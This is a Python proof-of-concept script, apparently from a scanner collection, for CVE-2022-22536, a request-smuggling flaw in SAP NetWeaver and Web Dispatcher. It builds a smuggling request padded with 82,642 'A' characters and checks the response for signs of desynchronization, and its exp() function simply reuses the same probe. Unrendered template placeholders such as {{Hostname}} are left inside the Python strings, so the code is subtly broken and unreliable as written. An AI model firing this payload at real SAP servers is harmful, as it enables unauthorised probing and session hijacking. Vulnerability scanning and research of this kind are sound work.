import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''SAP Memory Pipes (MPI) Desynchronization''',
        "description": '''SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable to request smuggling and request concatenation attacks. An unauthenticated attacker can prepend a victim's request with arbitrary data. This way, the attacker can execute functions impersonating the victim or poison intermediary web caches. A successful attack could result in complete compromise of Confidentiality, Integrity and Availability of the system.''',
        "severity": "critical",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-22536", 
            "https://wiki.scn.sap.com/wiki/display/PSR/SAP+Security+Patch+Day+-+February+2022", 
            "https://github.com/Onapsis/onapsis_icmad_scanner", 
            "https://blogs.sap.com/2022/02/11/remediation-of-cve-2022-22536-request-smuggling-and-request-concatenation-in-sap-netweaver-sap-content-server-and-sap-web-dispatcher/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2022-22536",
            "cwe-id": "CWE-444"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2022", "sap", "smuggling", "netweaver", "web-dispatcher", "memory-pipes"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/1.1\nHost: {{Hostname}}\nContent-Length: 82646\nConnection: keep-alive\n\n{{repeat("A", 82642)}}\n\nGET /"""
        method = "GET"
        data = """{{repeat("A", 82642)}}

GET / HTTP/1.1
Host: {{Hostname}}"""
        headers = {'Content-Length': '82646', 'Connection': 'keep-alive'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""HTTP/1.0 400 Bad Request""" in resp0.text or """HTTP/1.0 500 Internal Server Error""" in resp0.text or """HTTP/1.0 500 Dispatching Error""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url